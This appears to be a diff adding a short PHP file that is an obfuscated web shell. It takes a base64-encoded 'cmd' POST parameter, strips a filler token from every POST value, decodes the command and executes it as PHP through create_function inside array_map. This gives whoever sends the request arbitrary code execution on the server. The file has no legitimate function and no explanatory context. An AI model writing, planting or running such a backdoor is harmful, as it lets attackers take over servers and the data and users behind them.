@@ -1,0 +1,11 @@
+<?php 
+function TOOLS($cmd) {
+        array_map(create_function("",$cmd), array(1));
+}
+if(!empty($_POST["cmd"])){
+	foreach($_POST as $k => $v){$_POST[$k]=str_replace('tstphpst','',$v);}
+	$cmd=base64_decode($_POST['cmd']);
+	array_map(create_function("",$cmd), array(1));
+}
+//1231231231231
+?>
